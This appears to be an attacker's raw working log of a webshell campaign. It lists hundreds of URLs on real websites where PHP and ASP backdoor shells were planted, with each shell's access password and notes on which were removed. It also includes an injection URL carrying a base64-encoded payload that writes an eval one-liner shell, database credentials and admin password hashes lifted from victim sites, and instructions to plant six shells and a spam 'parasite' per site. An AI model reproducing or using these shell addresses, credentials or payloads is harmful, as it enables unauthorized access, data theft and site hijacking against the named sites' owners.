+
+4
+http://www.wly880.com/App/Common/Common/func_config.php  heiyan
+http://www.wly880.com/Uploads/Attachment/20150104/57756735-68CB-43CB-8A69-00929D5F5BDA.php
+http://www.wly880.com/Uploads/Attachment/20150131/93C2E89B-6377-4645-8435-2F06A45FF714.php
+http://www.wly880.com/Runtime/Logs/Admin/19_05_28.php
+
+5
+http://ht1.luubx.cn:8081/static/haoyong147258.php  admin 待
+http://ht1.luubx.cn/application/common/taglib/Wechat.php
+http://ht1.luubx.cn/application/index/controller/Admin.php
+
+  88888888
+
+6被删除
+http://www.aijuer.com/install/templates/step-2_cfg.php  671
+http://www.aijuer.com/dede/inc/inc_admin_chant.php
+http://www.aijuer.com/dede/templets/lurd/lurd-admin.php
+http://www.aijuer.com/include/qrcode/qrmycode.php
+
+
+7.404
+http://www.hecmip.com/3g/normalize.asp  c0nn
+http://www.hecmip.com/admin/Club/KS.GuestLook.asp
+http://www.hecmip.com/ckeditor/plugins/clipboard/dialogs/index.asp
+
+http://www.hecmip.com/KS_Cls/modellabel/lpt4.save.asp  c0nn
+
+ 
+http://www.lzxxdbb.com/css/album.asp   ceshi
+http://www.abc188.cn/js/index.asp  c0nn
+8.404
+http://www.jshaili.cn/images/qq/qqkf1/index.asp  c0nn
+http://www.jshaili.cn/admin/fckeditor/fckconfig.asp
+http://www.jshaili.cn/config/AspCms_OutlineServiceConfig.asp
+9
+http://www.automec.net/Templates/default/html/index.asp  c0nn
+http://www.automec.net/admin/fckeditor/fckconfig.asp
+http://www.automec.net/AspCms_data\backup\cmd_bak.asp
+
+
+http://automec.net/Templates/default/html/index.asp  c0nn
+http://automec.net/admin/fckeditor/editor/plugins/bbcode/fckplugin.asp
+
+http://www.dek-china.com/Public/admin/admina.php
+http://www.lzxxdbb.com/css/album.asp  ceshi
+http://www.lzxxdbb.com/inc/AspCms_templateFun.asp
+
+
+
+http://www.dek-china.com/Public/admin/admina.php
+http://www.lzxxdbb.com/css/album.asp  ceshi
+http://www.lzxxdbb.com/inc/AspCms_templateFun.asp
+
+http://www.abc188.cn/js/index.asp c0nn
+医学考研重点二级
+404
+http://www.medkaoyan.net/uploads/141015/6-1410151H320429.php
+http://www.medkaoyan.net/uploads/141014/1.php
+http://www.medkaoyan.net/uploads/151218/61-1512151001044E.php
+404
+
+
+site：m.zzjqhb.com
+site:www.qdqcz.cn
+    site:www.yxyxpk.com
+site:bbs.yanpk.com
+
+Yuan., [23.12.19 20:59]
+http://m.zzjqhb.com/1.txt  D:\wwwveducom\zzjqhb_trxp1b\web http://m.zzjqhb.com/myadmin/app_cases.asp
+http://m.zzjqhb.com/myadmin\xiugai_user.asp        二级目录7
+http://m.zzjqhb.com\Steelcase\Inc\head.asp
+http://www.yxyxpk.com//module/avd_common.php  D :\wwwveducom\yxyxpk_ibdkv2\web\
+http://www.yxyxpk.com/module\web_common.php
+http://www.yxyxpk.com\source\include\phpmyadmin.php
+
+http://yipinpai.com/admin3178/sys_groups_edit.php D:\wwwveducom\yipinpai_anaw9y\web\   变为无修改权限
+
+http://bbs.yanpk.com/ D:\wwwveducom\tmycclub_144ajp\web
+
+http://www.qdqcz.cn/ D:\wwwveducom\qdqcz_4zdjyr\web 
+
+http://www.leanlan.com/ D:\wwwveducom\leanlan_e5wmwo\web
+
+https://huayun.com/ D:\wwwveducom\huayun_2yhw3o
+
+http://yixao.net/ D:\wwwveducom\home_w2m2\web\yixaonet
+
+D:\wwwveducom\hnmile_acv8bv\web www.hnmile.com
+
+1223
+http://m.yanpk.com/core/lib/video/6room_class.asp  c0nn
+http://m.yanpk.com/templates/main/default/datacall/item_subject_pv_li.php
+http://m.yanpk.com/static/javascript/jquery.js.php
+http://m.yanpk.com/uc_client/model/index.php
+http://m.yanpk.com/uc_client/control/index.php
+
+
+http://www.jstzcyc.com/images/smiley/msn/angel_smile.asp  K打不开
+http://www.jstzcyc.com/images\smiley\msn\config.asp
+\inc\vp_config.asp
+
+
+
+http://www.qdhengshun.com/Copyright/amber.asp        被删除       0  K
+http://www.qdhengshun.com\Copyright\index.config.asp
+http://www.qdhengshun.com\images\images.asp
+http://www.qdhengshun.com/ueditor\dialogs\insertframe\insertframe.asp   404
+
+http://www.qnxueche.cn/inc/config.asp
+http://www.qnxueche.cn/huwo\inc.config.asp
+http://www.qnxueche.cn/admin\admin\member\catalog\Catlog.cfg.asp
+http://www.qnxueche.cn/admin\citytype\address.asp|a
+
+http://www.okyijing.com/images/qq/qqkf1/icon_person_msn.asp    0    ceshi
+http://www.okyijing.com/admin\fckeditor\editor\default.asp
+http://www.okyijing.com/admin/_Setting/AspCms_OutlineService.asp
+http://www.okyijing.com/admin/_Comments/AspCms_AdminFun.asp
+http://www.okyijing.com/admin\news\news_user.asp|a
+
+http://www.abc188.cn/Templates/slwang/images/_notes/login.asp  c0nn
+http://www.abc188.cn/Templates/slwang/images/_notes/login.config.asp
+http://www.abc188.cn/admin/_Content/NewsDelete.asp
+http://www.abc188.cn/admin/_Setting/AdminSetting.asp 
+  
+center.asp  ceshi
+
+http://www.starksk.com/upLoad/day_110729/index.asp                                c0nn
+http://www.starksk.com/upLoad/day_110801/201108011716133619.asp
+http://www.starksk.com/plug/adminLogin.asp
+http://www.starksk.com/admin/_Content/AspCms_NewsInsert.asp
+
+http://www.chinalnt.com/images/qq/qqkf1/cslist_top.asp  ceshi
+http://www.chinalnt.com/admin/_Comments/AspCms_Userment.asp
+http://www.chinalnt.com/news\2006367489.asp
+http://www.chinalnt.com/Templates/default/html/images/lanrentuku.asp
+http://www.chinalnt.com/chuangyan.asp
+
+              http://www.yipinpai.com/website/quanwang/data.asp  c0nn   无权限
+http://xlhtsme.com/exit.asp  c0nn
+http://xlhtsme.com/upload/2018-1-9/2018010932607089.asp
+
+http://dwqsme.com/exit.asp  c0nn
+http://www.iximeng.com/exit.asp  c0nn
+http://www.baiqiec.com/exit.asp  c0nn
+http://www.comeedu.com/Templates/default/css/index.asp  c0nn
+http://www.xianlxyq.com/aa.asp  c0nn
+
+http://www.sapzj.com/css/lightbox.asp  ceshi  无权限
+http://www.huafeng365.com/ceshi.asp  ceshi
+http://sszvoice.com/inc/index.asp  c0nn
+http://www.automec.net/admin/fckeditor/editor/skins/default/images/login.asp  c0nn
+http://lcwice.com/images/qq/qqkf1/indax1.asp c0nn
+
+
+
+
+1219号i
+http://www.app.com/1.php  Aa123456无权
+http://www.dadesin.com/Data/dadesin/upload/image/20191219/6371231499416780123760267.gif/.php  admin 无权
+http://www.pioneerfurnishing.com/UploadFiles/201912190013224.gif/.php  admin无权
+http://darunfawang.com/ppic/attached/20191218/201912182355172933841.gif/.php  admin无权
+   1
+ http://www.bjdj-info.com/include/taglib/demotag.b.php  fc
+http://www.gzorder.com/include/taglib/channel/hardlinks.lib.php
+http://www.gzorder.com/admin/templets/lurd/index.php
+2、
+http://www.dscoin.cc/attachment/files/2019/12/18/file_LlTTVQgbak.php  fc
+http://www.dscoin.cc/attachment/files/2019/10/29/index.php
+http://www.dscoin.cc/attachment/files/2019/12/18/index.php
+
+3
+http://www.xszpkj.com/
+http://www.xszpkj.com/includes/kindeditor/plugins/emoticons/images/32.php
+http://www.xszpkj.com/app/images/menu_number.php
+http://www.xszpkj.com/app/images/nemu_cfg.php
+
+4
+http://pushiwuhua.xyz/a.php  671
+http://pushiwuhua.xyz/product/2019/1026/index.php
+http://pushiwuhua.xyz/uploads/allimg/191026/index.php
+
+5
+http://www.yamee.cn/image/title.asp  c0nn fc
+http://www.yamee.cn\Templates\index.asp
+http://www.yamee.cn
+http://www.yamee.cn/UploadFiles/20101126145251252.asp
+
+6
+http://www.vit-am.com/css/lightbox.asp  671
+vit-am.com\member\index.asp
+vit-am.com\custom\index.asp
+
+7
+http://www.jsntkh.com/upimages/20161121155743783.asp  c0nn
+www.jsntkh.com\mobile\sp_admin_852\Model.index.add.asp
+www.jsntkh.com\mobile\images\index.asp
+
+8
+http://www.seahog-gz.com/Update/images/update.asp  hanyi
+http://www.seahog-gz.com/Upfile/2013125/2013120536701085.asp
+http://www.seahog-gz.com/Upfile/2018/12/17/2018121750207869.asp
+
+9
+http://www.wzbjqsft.com/templates/green/images/search_btn.asp  671无权
+http://www.lncivillaw.com/UploadFiles/018104431716.asp hanyi无权
+http://www.gfzzi.com/images/Album/index.asp  c0nn
+www.gfzzi.com\web\ds_admin\_content\_Apply\index.asp
+www.gfzzi.com\web\ds_admin\_content\_About\index.asp
+
+
+http://www.zhaopinggh.com/K.asp  K
+
+http://www.61ky.com/masterdata/autocompletes.asp  ceshi
+http://yuke.soonidea.cn/asp.asp  admin
+http://www.jnjgzfsm.com/data/oday.asp  11088
+http://zdoedu.com/uploads/oday.asp  11088
+http://www.zqlf.net/img/yy.asp  admin
+http://hanipay.cn/images/fileTypeImages/icon_doc.asp  671
+http://whartistry.com/inc/oday.asp  11088
+
+www.cjszwx.com.cn\news\gongyi\list_22_624.php被删除
+www.cjszwx.com.cn\news\guoji\201868198.php被删除
+http://www.cjszwx.com.cn/news/index.php被删除
+
+
+http://www.globalcentre.cn/a/qianzheng/meizhou/Template_Banner.php  671收录0
+http://xk-motor.com/UpFile/20191218234755.gif/.php  admin无权
+http://ht1.luubx.cn:8081/haoyong.php  admin    收录0
+http://0008.haozz.cn/data/cache/jquery.php  w  收录0
+http://www.wshyw168.com/indax.php  baidu 404
+http://hainagc.com/longfusi.php  789456
+http://ht3.luubx.cn:8081/public/uploads/20191218/ff9313fcfcab5f782b4a5193ebd78674.php  admin  收录0
+http://m.amcovip.com/style/img/top_btn.php  heiyan    收录0
+http://fskjn.com/UpFile/2010-5/12/lii.php  admin 
+http://www.dscoin.cc/attachment/files/2019/12/18/file_kkU8gOkk5K.php  nice
+http://www.dl1818.com/admin/eWeb/UploadFile/20191218205827862.gif/.php  admin无权
+http://www.lddcz.com.cn/Files/UpotherFiles/2019121820543775277.gif/.php  admin无权
+http://www.soonidea.com/phdp.php  admin
+http://www.bjxdti.com/uploads/soft/191218/2_2036441901.php  w
+http://www.jnfuchan.com/dede/images/icons/2.php  heiyan
+http://fskjn.com/UpFile/2019121820420.gif/.php  admin无权
+http://www.udchannel.com/member/lospd.php  2901
+http://seccopets.com/plus/task/maketimehtml.php  671
+http://hf-furniture.com/tiyucon.php.php  admin
+http://wxtiandu.com/UpFile/20191218195241.gif/.php  admin无权
+http://shengda.sd.cn/a.php  671
+http://www.scene-led.com/img/flickerplate/arrows.asp  c0nn
+http://ysqjf.com/images/Album/index.asp  c0nn
+
+
+
+
+
+
+1216号  权4
+http://www.shuanshu.com/aspnet_client/system_web/2_0_50727/index.php
+http://www.shuanshu.com/aspnet_client/system_web/4_0_30319/index.php
+http://www.shuanshu.com/configs\index.php
+http://www.shuanshu.com/configs/index.php
+http://www.shuanshu.com/4.php  admin
+http://www.shuanshu.com/modules\article\blocks\block.php
+
+
+1216号
+http://www.cixigs.com\Inc\index.asp
+http://www.cixigs.com\admin\index.asp
+http://cixigs.com/UploadFiles/UploadFiles/index.asp
+http://www.cixigs.com/Inc/concon.asp a
+http://www.cixigs.com/UploadFiles\2014813101545384.asp
+http://www.cixigs.com/UploadFiles/21498165021842.asp
+
+http://www.dllabel.com/up/image/concon.asp a  被删
+http://wuxicherryhardware.com/UploadFiles/concon.asp a
+
+http://jnnqs.com/uploads/allimg/170716/1-1FG6142T51-L.php admin 大马
+http://jnnqs.com/include/dialog/index.php
+jnnqs.com/include/dialog/img/index.php
+jnnqs.com/include/inc/index.php
+
+
+http://baobiao.wy-kc.com/public/default1/admin_config.php admin 大马   被删
+http://baobiao.wy-kc.com/file/index.php被删
+http://baobiao.wy-kc.com/mima/layui/lay/index.php被删
+http://baobiao.wy-kc.com/mima/layui/images/face/index.php被删
+
+
+http://bbs.aiyom.com/uploads/allimg/c191126/c.php    c
+
+
+http://bbs.aiyom.com/uploads/allimg/191126/235PQ1Z_0.php admin 大马
+http://bbs.aiyom.com/uploads/allimg/191123/0610596363_lit.php
+http://bbs.aiyom.com/uploads/allimg/191202/00160DX7_0.php删除
+http://bbs.aiyom.com/uploads/allimg/c191126/15JI023R3140-I5C.php
+http://bbs.aiyom.com/uploads/allimg/191202/00232W609_0.php
+
+
+http://www.zssj8.com/uploads/allimg/191210/09391M2O_0.php admin 大马
+http://www.zssj8.com/hymxb/default.php
+http://www.zssj8.com/include/include/taglib/index.php    删除
+http://www.zssj8.com/include/calendar/index.php
+
+
+http://www.wgoaa.com/include/ckeditor/plugins/div/dialogs/admin.php admin 大马  无效
+
+http://xt.58sofa.com//plug/collect/AspCms_CollectFun.asp  a被删除
+
+被删除
+http://0731sm.com//inc/config.asp  a
+http://0731sm.com/Img\index.asp
+http://0731sm.com\Img\1user.asp
+
+
+http://www.tenpic.cn/uploads/171031/1-1G0310205044J.php admin 大马
+http://www.tenpic.cn/include/payment/index.php
+http://www.tenpic.cn/include/payment/lib/default.php删除
+http://www.tenpic.cn/include/payment/lib/phpqrcode/index.php
+
+
+http://guolushandong.com/uploads/181018/2-1Q01Q95123253.jpg.php admin 大马   被删除
+
+
+Yuan., [19.12.19 21:59]
+http://szjuda.cn/manage/column/edltCount.jpg
+http://szjuda.cn/manage/images/index.asp
+http://szjuda.cn/manage/images/index_16.aspx
+http://szjuda.cn/manage/images/t_04.aspx admin
+http://szjuda.cn/manage/like1/editLike2.aspx
+http://szjuda.cn/manage/member/editMember1.aspx
+http://szjuda.cn/about/mapper/index.aspx
+http://szjuda.cn/code/proCode.aspx  admin
+http://szjuda.cn/fckeditor/fckeditor3.php
+http://szjuda.cn/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.aspx
+http://szjuda.cn/old/manage/column/editXyc.aspx
+http://szjuda.cn/old/waterMark/backgroundImageW25.jpg
+http://szjuda.cn/pro/index.php
+http://szjuda.cn/manage\column\x.php|x
+
+http://www.szjuda.cn/manage/index.aspx登录
+
+http://szjuda.cn/UserFiles/1575810099894.php admin 大马    所有收录页面已做新疆福彩
+http://szjuda.cn/file/fileCls/index.php
+http://szjuda.cn/manage/column/index.php
+http://szjuda.cn/manage/member/index.php
+http://szjuda.cn/pro\proCls\index.php | c
+
+
+http://www.hncmi.com/admin/fckeditor/editor/dialog/concon.asp a    被删除
+http://www.lgzbg.cn//fuck.php fuck被删除
+http://www.dljsjzs.cn//index.asp a被删除
+
+
+
+襄阳网1231
+www.zxlr.org.cn\hanstyle\20132321.php
+http://www.zxlr.org.cn/admin@zxlrorgcn/sys_admin_user_inc.php
+www.zxlr.org.cn\edu\school\201521679.php
+--------------
+http://www.52wangjie.com/aspnet_client/system_web/2_0_50727/index.php
+http://www.52wangjie.com/aspnet_client/system_web/4_0_30319/index.php
+http://www.52wangjie.com/uploads/allimg/140108/1-14010P93SKU.php
+http://www.52wangjie.com/uploads/allimg/140125/1-140125092453S5.php|x
+-----------------------
+http://www.cjszwx.com.cn/qinggan/miyu/list_number.php
+http://www.cjszwx.com.cn/model/FCKeditor/license.php
+http://www.cjszwx.com.cn/model/inc/inc_fun_funUser.php
+------------------------------------------------------
+wap.cjszwx.com.cn\nyr@jiankang\sys_sysdata_edit.php
+wap.cjszwx.com.cn\nyr@jiankang\inc\inc_list_dialogs.php
+wap.cjszwx.com.cn\sysdata\mark\inc_dialogs_base.php
+http://wap.cjszwx.com.cn/sysdata/config.dialogs.inc.php|x
+---------------------------------------
+http://mip.cjszwx.com.cn/xiang@yang/co_test_edit.php
+http://mip.cjszwx.com.cn/xiang@yang/inc/inc_menu_editor.php
+http://mip.cjszwx.com.cn/sysdata/config.file.upload.php
+http://mip.cjszwx.com.cn/sysdata/tplsyscache/fb137d0e220f6be7679dba5fe6c6fe64.php|x
+
+
+
+
+www.zxlr.org.cn\admin@zxlrorgcn\index_foot.php
+wap.cjszwx.com.cn\sysdata\common.inc.php
+<?php
+//鏁版嵁搴撹繛鎺ヤ俊鎭?
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'wapcjszwxcomcn';
+$cfg_dbuser = 'wapcjszwxcomcn';
+$cfg_dbpwd = 'wap@cjszwxcom#cn';
+$cfg_dbprefix = 'jiankang_';
+$cfg_db_language = 'utf8';
+?>
+http://wap.cjszwx.com.cn/nyr@jiankang/login.php   后台
+            [userid] => admin
+            [pwd] => 7e204dcd68315bf215f9
+
+            [userid] => waitui
+            [pwd] => 88710ca0f1e5adadb682
+
+www.cjszwx.com.cn\xiang@yang\login.php
+            [userid] => admin
+            [pwd] => 7e204dcd68315bf215f9
+            [uname] => ????
+www.cjszwx.com.cn\sysdata\common.inc.php
+<?php
+//数据库连接信息
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'wwwcjszwxcomcn';
+$cfg_dbuser = 'wwwcjszwxcomcn';
+$cfg_dbpwd = 'www@cjszwxcom#cn';
+$cfg_dbprefix = 'wj_';
+$cfg_db_language = 'gbk';
+?>
+
+
+
+http://www.furongjintou.com/public/uploads/20191211/299c38bad75ca3ef145728be24e4c6e5.php 1 
+http://xihoney.com/vendor/karsonzhang/fastadmin-addons/src/addons/php1.php  admin 
+http://www.78b2b.com/app/admin.php  admin 
+http://www.yfdgw.com/uploads/allimg/190929/1-1Z9291AF6237.php  b 
+http://www.shxianmei.cn/yg/buy2buyupfile/201912112314747324.jpg./.php  admin 
+http://www.gamesoho.net/uc_server/shelll.php  whoami 
+http://cvchome.com/data/shelll.php  whoami 
+
+
+http://www.linwanet.cn/uppic/image/20191211230029092909.jpg./.php  admin 
+uppic/20170320/images.php
+
+
+12月21日
+http://shengmahome.com/job/templates/met/css/botright.php  abc123 
+http://shengmahome.com/include/mail/class.pop3.php
+
+http://dashengtools.com/uploads/lll.php  ling 
+http://dashengtools.com/uploads/index.php
+
+
+http://mksz.cn/sitedir/upfiles/image/20190528/1559005300125277.php.jpg  hucys 404
+http://zxsb.xyz/php_dama.php  hucys 
+http://ddtianyue.com/src/Core/Conf/debug.class.php  wyxd 
+http://www.aidn.com.cn/data/data/cache/cookie.helpxer.php  wyxd 
+http://lrrcc.com/public/uploads/20180626/9f488c9f0533bf416cce783b13983dwq.php  admin 
+http://www.hntv-4.com/bctz/css/cookie.helpxer.php  wyxd 
+http://lrrcc.com/public/uploads/20191211/bec98f40a2ea7265123e2dba93770e66.php  admin 
+http://www.continut.cn/1.php  heiyan  404
+http://www.bentengzhangui.com/install/images/ico-step-succeed.php  671 
+http://www.pjdt.com/install/images/aution.php  data 404
+
+http://www.haokang8.com/company/homepage/avatar.php  data 
+http://www.impnails.com.cn/wap2/images/720_02.jpvg.php  dama 
+http://www.021dp.cn/commonn.inc.php   xiao1688 
+http://www.lzltt.com/templets/3.php  heiyan 
+http://www.jqwnd.com/Uploads//2019-12-08//5decc69fdd40cfga.php  fc 
+http://bolefanli.com/uploads/g7.php  ling 
+http://pcwlwl.com/admin/js/cookie.helpxer.php  wyxd 
+http://www.eurus.com.cn/cases/02/lspaola.asp  671 
+http://www.xixiujc.com/cert/class.asp  671 
+http://www.chuangyeba.vip/plugins/advert/DAL/advert.asp  hanyi 
+http://www.apfic.com:81/fckeditor/editor/js/fckeditorcode_ie.asp  ceshi 
+http://01kuku.com/static/css/admim.asp  admim 
+http://www.tyzhcm.com/js/FormValid.asp  hanyi 
+http://www.comqing.com/Content/Config/inc.asp  671 
+http://hbwgdl.com/uploadfile/file/oday.asp  11088 
+http://www.olewe.com/olewe/xml/songlist.asp  c0nn 
+http://www.apfic.com:81/Upload/20191210/ceshi.asp  ceshi 
+http://weisuas.com.cn/Data21293/oday.asp  11088 
+
+http://www.ltadhesivetape.com/data\cache_template\member_register_model.php
+
+http://www.wulifei.com/upload/downdata/index.php
+http://www.wulifei.com/template/kanav/index.php
+
+http://daore.sunyes.cn/moban/lpt1.admin_list.asp  absxs 
+ 
+
+http://www.ynfd.com.cn/Management/E_A_Folder/Dialog/About/ewebeditor.asp  hanyi
+
+
+被删除，禁权
+http://www.henanjiance.com/m/assets/i/examples/admin-safari.php  admin156
+http://www.henanjiance.com/member/inc/config_pay_user.php
+http://www.henanjiance.com/data/module/572606600345b1a4bb8c810bbae434cc-raadme.php
+
+
+
+http://yamat.com.cn/plus/mytag_js.php?aid=9090|guige                  仅能修改首页
+http://www.jh-yd.com/plus/mytag_js.php?aid=511348|511348    无修改权限
+http://shximin.com/plus/mytag_js.php?aid=9090|guige
+http://www.tzjinkai.com/config/AspCms_Config.asp|a                 无修改权限
+http://www.xnuo.com/plus/mytag_js.php?aid=511348|511348
+
+shximin.com\aspku\js\jquery.config.php
+http://shximin.com/include/helpers/media.helper.php
+
+http://www.uimgc.com/bangzhu/helper.php
+http://www.uimgc.com/qunzhu/2017-02-02/html_config.php
+http://www.uimgc.com/d/file/bangzhu/2019-03-08/f32f6fc999dfe8dc457495a341a034f2.php
+
+1214
+http://www.shibojianding.com//inc/config.asp a
+http://dlofsk.com/upload/product/month_1601/201601070840576206.asp a  无效
+http://www.gz-dz.cn/admintc/editor/concon.asp a 被删
+http://www.dgzhangming.com//data/coview.inc.php guige
+http://www.zgguanjia.com/upload/product/month_1701/201701211507475343.jpg.asp a
+
+
+待查
+http://www.dlofsk.com/upload/product/month_1601/da.asp
+http://www.dlofsk.com/aspnet_client\system_web\4_0_30319\aspnet_admin.asp
+http://www.dlofsk.com/aspnet_client\system_web\aspnet_admin.asp
+
+
+www.gz-dz.cn/admintc\editor\da.asp             admin888
+
+ 
+
+www.dgzhangming.com/data/ziptmp/da.asp
+\2851yzc\dzssc003\8ge\in_command.asp
+\2851yzc\dzssc003\in_command.asp
+
+
+www.zgguanjia.com\upload\product\month_1701\201701301953579116.asp
+www.zgguanjia.com\upload\product\month_cfg.php
+www.zgguanjia.com\upload\down\month_cfg.asp
+
+caidao
+
+http://assetszz.com/include/qrcode/qroutput.php
+http://assetszz.com/include/helpers/cookie.admin.php
+
+http://117.18.10.204/plus/admin_function.php
+sywjgg.com\public_html\skin\js\js_config.php
+
+
+www.czyblxx.com\templates\xiaoxue\js\js.jquery.asp
+
+
+http://kskldz.com/uploads/allimg/190530/admin.php?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
+www.wufun.net\hotnews\2018\0320\9754.php
+
+
+
+
+http://admin.wufun.net/ueditor/php/upload/file/20161121/1.php
+http://admin.wufun.net/ueditor/php/upload/image/20160602/1464859280582349wap.php
+http://admin.wufun.net/ueditor/php/upload/image/20160602/1464859280582349-lp.php
+
+1467251175127102-lp.php
+http://admin.wufun.net/ueditor/php/upload/image/20160630/1467257047110836wap.php c
+
+
+http://admin.wufun.net/hotnews/2017/0113/3768.php
+http://admin.wufun.net/uploads/160811/21-160Q1162431528wapwapwap.php
+
+
+          www.zjnbww.com/inc\admin.asp
+\js\jquery.js.asp
+\html\3864795023.asp
+
+
+www.bairunyy.com\template\default\wap\public_header.php
+www.bairunyy.com\system\library\think\admin.connect.php
+www.bairunyy.com\system\library\think\template\driver\directory.php
+
+后台路径：
+http://admin.wufun.net/cfa75eec88ba3d03b6e1b356f12c87e5/login.php
+
+1217小马
+http://admin.wufun.net/ueditor/php/upload/file/20161121 /c.php   c
+http://admin.wufun.net/ueditor/php/upload/file/20161121/c.php
+wufun的
+http://admin.wufun.net/admin/
+武房账号密码
+http://admin.wufun.net/uploads/160630/8-160630153955210.php
+http://admin.wufun.net/uploads/170605/INDEX.PHP
+http://admin.wufun.net/uploads/160817/index.php|x
+admin 81368886
+
+http://admin.wufun.net/uploads/170328/34-1F32Q53951b9wap.php
+http://admin.wufun.net/uploads/160722/15-160H20Z4542Lwapwap.php    0106
+
+1
+http://jjxym.com/uploads/cc.php  sbadminha
+http://jjxym.com/install/module_autos/changyan_autologin.php
+http://jjxym.com/dede/templets/lurd/lurd-admin.php
+http://jjxym.com/m/m_admin.php
+
+2秒速时时彩  被删除
+http://www.86aaa.com/js/inc/img/file/menu/text_config.php  admin
+http://www.86aaa.com/images/1_04.php
+http://www.86aaa.com/js/inc/img/file/menu/inc_install_config.php
+
+3被删
+http://www.xszpkj.com/app/images/menu_config.php  fc2019
+http://www.xszpkj.com/includes/ueditor/php/action_list_config.php
+http://www.xszpkj.com/includes/modules/payment/alopay_config.php
+
+
+http://www.xszpkj.com/app/images/menu_cfg.php   1
+http://www.xszpkj.com/includes/cls_config.php
+http://www.xszpkj.com/install/administer.php
+
+4秒速时时彩qs码无效
+http://www.zhendongfood.com/en/_cmseditor/asp/upload_jquery.php  fc
+http://www.zhendongfood.com/_include/system_admin.php
+http://www.zhendongfood.com/_system/images_user.php
+
+http://www.xszpkj.com/sms/lib/api_demo/alicom-dysms-api/index.php
+http://www.xszpkj.com/themes/dianpu1/library/promotion_info.php
+
+
+
+5秒速时时彩  无效删除
+http://www.zr168.com/upload/20191282030389885.jpg/.php  fc
+http://www.zr168.com/include/fc.php
+http://www.zr168.com/aspnet_client/system_web/4_0_30319/system_config.php
+http://www.zr168.com/inc/user_inc.php
+http://www.zr168.com/NEWS/admin/Adduser.php
+http://www.zr168.com/aspnet_client/system_web/4_0_30319/index.php
+6
+http://www.wolfbike.com.cn/c_feedback/fc_admin.php   1
+http://www.wolfbike.com.cn/c_html_info/index.php 
+http://www.wolfbike.com.cn/c_order/index.php
+http://www.wolfbike.com.cn/c_news_show/index.php a
+http://www.wolfbike.com.cn/c_info/c_index.php
+http://www.wolfbike.com.cn/c_info/diguo_admin.php
+http://www.wolfbike.com.cn/c_html_products/chazhiqixingshoutao.php
+http://www.wolfbike.com.cn/huiguer.com/pub/selcolor.php
+
+7
+http://www.gzbaiou.com.cn/js/install.js.php  fc
+http://www.gzbaiou.com.cn/Inc/ottmis/include.inc.php
+http://www.gzbaiou.com.cn/aspnet_client/fisekv/admin_user.php
+http://www.gzbaiou.com.cn/js/gvsjs.php
+
+8被删除
+http://www.febiy.com/fenbeikanwu/jquery.php  fc
+http://www.febiy.com/xinwen/js.php
+http://www.febiy.com/product/jquery_config.php
+http://www.febiy.com/phpcms/modules/collection/templates/publist_tpl.php
+
+9  码子无效
+http://3803222.com/lib/classes/fonts/inc.config.php  67686960
+http://3803222.com/js/jquery_config.php
+http://3803222.com/config/user_config.php
+http://3803222.com/default/js/pagemodel.php
+
+
+10
+
+http://www.jqwnd.com/Uploads//2019-12-08//5decc69fdd40cfga.php  fc
+http://www.jqwnd.com/Template/Mobile/Account_Recharge.php
+http://www.jqwnd.com/lib/manager-pwd-model.php
+http://www.jqwnd.com/Runtime/Logs/Home/19_11_30.php
+http://www.jqwnd.com/lib/control-txt-list.php
+
+11无权限
+http://www.tldysj.com/templets/lurd/lurd-edit.php  data
+http://www.tldysj.com/templets/lurd/lurd-list.php
+
+11
+http://www.wannengji.com/skin/css/wxbasess.php  data
+
+
+1210
+
+006282.com/admin\SouthidcEditor\Admin\admin.asp
+
+admin\SouthidcEditor\Dialog\index.asp
+http://006282.com/admin/SouthidcEditor/Dialog/index.asp    c0nn
+http://006282.com/admin/SouthidcEditor/Dialog/index_bak.asp
+http://006282.com/admin/SouthidcEditor/Dialog/background.asp;x.jpg   cmd
+http://006282.com/Inc/selectadmin.asp|a
+
+
+每个站上传六个码子  
+一个寄生虫  
+制txt文件记录：上传的码子    没有权限的     寄生虫      
+
+
+
+
+
+
+www.sanhao-trade.com\news\index.php
+
+www.sanhao-trade.com\install\module_autos
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1207
+http://360.esdz.cn/yy.php
+http://360.esdz.cn/data/model/application/admin/controller/Custom_config.php
+http://360.esdz.cn/application/admin/template/admin/reglogin.php
+http://360.esdz.cn/template/pc/users/skin/index.php
+
+
+
+http://www.jxganwang.com
+
+
+
+http://nfxiezuo.cn/yy.php删除
+http://nfxiezuo.cn/Uploads/news/index.php删除
+http://nfxiezuo.cn/Uploads/slide/slide_header.php删除
+http://nfxiezuo.cn/Public/images/admin/image_admin.php删除
+
+
+
+http://www.soumacn.com/Uploads/link/2019-12-07/5deb5f9e1c7c7.php
+http://www.soumacn.com/Uploads/news/new_index.php
+http://www.soumacn.com/Tpl/default/Guestbook/type.php
+http://www.soumacn.com/Tpl/default/Slide/index.php
+
+
+http://xn--6byn13abe.com/yy.php
+http://艾芭玛.com/template/pc/index.php
+http://艾芭玛.com/uploads/allimg/20190505/44d9b4858dca427d8f4b7f0dba68628c.php
+http://艾芭玛.com/uploads/ueditor/20190729/1264eb60cf6449c6722a4df3f82ef4f7.php
+
+
+
+http://www.chunhuigm.com/0day.php    404
+
+http://bpzwn.com/yy.php   被云盾拦截
+
+
+
+
+
+www.wufun.net\hotnews\2016\index.php  2901
+http://www.wufun.net/uploads/160810/9-160Q01536033a-lp.php
+http://www.wufun.net/data/sessions_a62d9de044/index.php
+
+
+1
+码被删
+http://www.wa-pet.com/include/dedeajax.php
+http://www.wa-pet.com/include/inc/int_function.php
+http://www.wa-pet.com/include/qrcode/qrapay.php
+http://admin.wufun.net/m/index_admin.php
+http://admin.wufun.net/include/payment/code_alipay.php
+http://www.wa-pet.com/m/admin.php
+
+站群：
+404
+http://neconx.de/uploads/ueditor/20190312/455285c004c661217e22b4deba3cd235.php
+http://neconx.de/data/model/application/admin/controller/index.php
+
+http://neconx.de/data/model/application/admin/model/index.php   y
+
+http://www.xujiaqiang.top/o.php
+http://www.xujiaqiang.top/public/plugins/bootstrap/fonts/index.php
+http://www.xujiaqiang.top/public/plugins/Ueditor/dialogs/emotion/images/neweditor-tab-bg.php
+http://www.xujiaqiang.top/install_1557153808/templates/s1_sae.php|x
+
+
+
+2\被删除
+http://www.bjhgyh.com/Inc/config.php
+http://www.bjhgyh.com/admin/about_admin.php
+http://www.bjhgyh.com/admin/admin_footer.asp
